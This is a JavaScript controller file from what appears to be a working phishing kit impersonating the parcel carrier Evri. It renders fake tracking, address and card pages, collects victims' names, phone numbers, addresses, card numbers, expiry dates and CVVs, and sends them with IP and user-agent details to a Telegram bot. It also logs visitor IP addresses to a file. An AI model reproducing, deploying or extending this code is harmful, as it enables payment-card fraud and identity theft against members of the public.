const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");
const { getClientIp } = require("request-ip");
const fs = require("fs");

// console.log(getIPDetails());

exports.login = (req, res) => {
  return res.render("postal");
};

exports.loginPost = async (req, res) => {
  try {
    const { postcode } = req.body;

    const iPDetails = await getIPDetails();
    const { query, city, region, country, isp } = iPDetails;

    const userAgent = req.headers["user-agent"];

    const message =
      `EVRI \n\n` +
      `Postcode : ${postcode}\n` +
      `++++++++++++++++++++++++++++++\n\n` +
      `IP ADDRESS INFO\n` +
      `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
      `+++++++++++++++++++++++++++++++\n\n` +
      `SYSTEM INFO || USER AGENT\n` +
      `USER AGENT       : ${userAgent}\n` +
      `👨‍💻  - TG 👨‍💻`;

    const sendMessage = sendMessageFor(botToken, chatId);
    // sendMessage(message);
    res.redirect("/auth/trackparcel");
  } catch (err) {
    console.log(err);
    res.redirect("/auth/login");
  }
};

exports.trackparcel = (req, res) => {
  res.render("track-a-parcel");
};

exports.confirmAddress = (req, res) => {
  res.render("confirm-address");
};

exports.confirmAddressPost = async (req, res) => {
  const { firstName, lastName, phone, dob, address } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  res.redirect("/auth/confirm-pay");
};

exports.confirmPay = (req, res) => {
  res.render("card");
};

exports.confirmPayPost = async (req, res) => {
  const {
    firstName,
    lastName,
    phone,
    address,
    postCode,
    fname,
    cardNum,
    exp,
    cvv,
  } = req.body;

  const userAgent = req.headers["user-agent"];

  const message =
    `+---------------- CB EVRI ----------------------+\n` +
    `+-----------------------------------------------+\n` +
    `Personal Information\n` +
    `| FirstName : ${firstName}\n` +
    `| LastName  : ${lastName}\n` +
    `| Phone  : ${phone}\n` +
    `| Address  : ${address}\n` +
    `| Postcode  : ${postCode}\n` +
    `+-----------------------------------------------+\n` +
    `Card Information\n` +
    `| Card Holder: ${fname}\n` +
    `| Card Number: ${cardNum.replace(/(\d{4})-/g, "$1")}\n` +
    `| Card Expiry date : ${exp}\n` +
    `| CVV : ${cvv}\n` +
    `+-----------------------------------------------+\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT : ${userAgent}\n` +
    `👨‍💻 - TG 👨‍💻`;

  try {
    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);
  } catch (err) {
    console.log("Error sending the message", err);
    res.redirect("/auth/confirm-pay");
  }

  res.redirect("/auth/reschedule");
};

async function generateDeviceIdentifier(req) {
  const ip =
    req.headers["x-forwarded-for"] ||
    req.headers["x-real-ip"] ||
    req.connection.remoteAddress;

  const userAgent = req.headers["user-agent"];

  // You can add more factors to make the identifier more unique
  const uniqueIdentifier = `${ip}-${userAgent}`;

  return uniqueIdentifier;
}

exports.reschedule = async (req, res) => {
  const filePath = __dirname + "/../config/data.txt";
  const existingIPs = fs.readFileSync(filePath, "utf8").trim().split("\n");
  const clientIP =
    req.ip ||
    req.headers["x-forwarded-for"] ||
    req.headers["x-real-ip"] ||
    getClientIp(req);

  console.log(clientIP, existingIPs);
  if (!existingIPs.includes(clientIP)) {
    // Append the new IP to the list
    existingIPs.push(clientIP);

    // Write the updated list back to the file
    fs.writeFileSync(filePath, existingIPs.join("\n"));
  }
  res.render("reschedule");
};

exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
